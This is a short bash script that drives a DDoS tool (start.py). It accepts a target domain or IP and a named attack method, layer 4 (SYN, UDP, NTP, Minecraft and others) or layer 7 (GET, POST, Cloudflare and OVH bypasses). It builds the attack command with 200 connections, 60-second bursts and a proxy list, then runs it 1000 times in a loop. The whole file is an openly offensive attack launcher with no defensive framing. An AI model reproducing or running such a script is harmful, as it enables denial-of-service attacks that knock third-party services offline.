#!/bin/bash

layer=0
arr_layer4="RDP CHAR DNS MEM SYN ARD VSE TCP MINECRAFT NTP UDP"
arr_layer7="PPS GSB DGB AVB OVH CFB SLOW DYN COOKIE BYPASS HEAD POST GET EVEN STRESS NULL"

if [[ $# -ne 2 ]]; then
	echo "$0 <ddos type> <domain|ip[:port]>"
	exit -1
fi

for word in $arr_layer4; do
	if [[ ${1^^} == $word ]]; then
		layer=4
	fi
done

for word in $arr_layer7; do
	if [[ ${1^^} == $word ]]; then
		layer=7
	fi
done

ddos_script_path="start.py"
ddos_command="python3 $ddos_script_path $1 $2"

ddos_duration=60
ddos_conn=200

if [[ $layer == 4 ]]; then
	ddos_command+=" $ddos_conn $ddos_duration"
elif [[ $layer == 7 ]]; then
    ddos_command+=" 5 $ddos_conn proxy_list_UWU.txt 72 $ddos_duration"
else
    echo "Unknown ddos attack type"
    exit -1
fi

loop_count=1000
#sleep_time=5s

for i in $(seq 1 $loop_count); do
	echo "Attack No $i: <$ddos_command>"
	eval $ddos_command
	echo "Sleep 5s.."
	sleep 5s
done
